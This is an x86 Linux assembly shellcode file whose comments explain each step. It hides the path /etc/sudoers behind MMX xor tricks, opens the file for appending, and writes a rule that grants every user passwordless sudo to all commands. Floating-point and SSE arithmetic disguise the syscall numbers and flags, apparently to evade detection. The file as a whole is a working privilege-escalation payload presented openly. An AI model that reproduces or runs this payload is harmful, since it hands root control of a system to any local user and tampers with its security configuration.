global _start

section .text
_start:
	push esp
	; make the base pointer the same as the current stack pointer, since
	; operations with pointers are one byte smaller with the former
	pop ebp

	xor eax, eax
	cdq				; make edx zero, too

	push 0xcafebabe			; initial xor value
	push edx			; nul character
	push 0xb98cdfd1
	push 0x17071640
	movd mm0, [ebp - 0x4]		; load initial xor value
	pxor mm0, [ebp - 0xc]		; oers
	movd [ebp - 0xc], mm0		; overwrite result on the stack
	pxor mm0, [ebp - 0x10]		; /sud (xor with the previous result)
	movd [ebp - 0x10], mm0		; overwrite result on the stack
	emms				; done with mmx, switch to x87
	push 0x6374652e			; .etc
	mov ebx, esp			; pathname
	inc byte [ebx]			; make the first character a slash
	push 0x20
	fild dword [esp]		; load current value on the stack
	fmul st0			; multiply by itself
	fist dword [esp]		; overwrite value on the stack
	pop ecx
	inc ecx				; flags (O_WRONLY | O_APPEND)
	or al, 0x5
	; int open(const char *, int)
	int 0x80

	xchg ebx, eax			; move new file descriptor
	push edx			; nul character
	push 0x0a4c4c41			; ALL
	push 0x203a4457			; WD:
	push 0x53534150			; PASS
	push 0x4f4e2029			; ) NO
	push 0x4c4c4128			; (ALL
	push 0x3d4c4c41			; ALL=
	push 0x204c4c41			; ALL
	mov ecx, esp			; buf
	or dl, 0x1c			; count (28 bytes)
	push 0x2
	movss xmm0, [esp]
	addss xmm0, [esp]
	movd eax, xmm0
	; ssize_t write(int, const void *, size_t)
	int 0x80
